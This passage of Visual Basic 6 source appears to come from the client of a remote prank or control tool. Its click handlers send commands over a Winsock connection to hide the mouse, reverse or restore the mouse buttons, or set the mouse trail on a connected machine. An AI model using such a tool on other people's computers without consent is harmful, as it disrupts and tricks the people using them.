...
Private Sub lblhide_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "HideMouse"
frmMain.Status.Caption = "hiding the mouse..."
End If
End Sub

Private Sub lblhidetrail_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "HideMouseTrail"
frmMain.Status.Caption = "hiding the mouse trail..."
End If
End Sub

Private Sub lblrestore_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "RestoreMouseButtons"
frmMain.Status.Caption = "restoring mouse buttons..."
End If
End Sub

Private Sub lblreverse_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "ReverseMouseButtons"
frmMain.Status.Caption = "reversing mouse buttons..."
End If
End Sub

Private Sub lblsettrail_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "SetMouseTrail;" & lbltrail.Caption
frmMain.Status.Caption = "setting mouse trail..."
End If
End Sub

Private Sub lblshow_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "ShowMouse"
frmMain.Status.Caption = "showing mouse..."
End If
End Sub
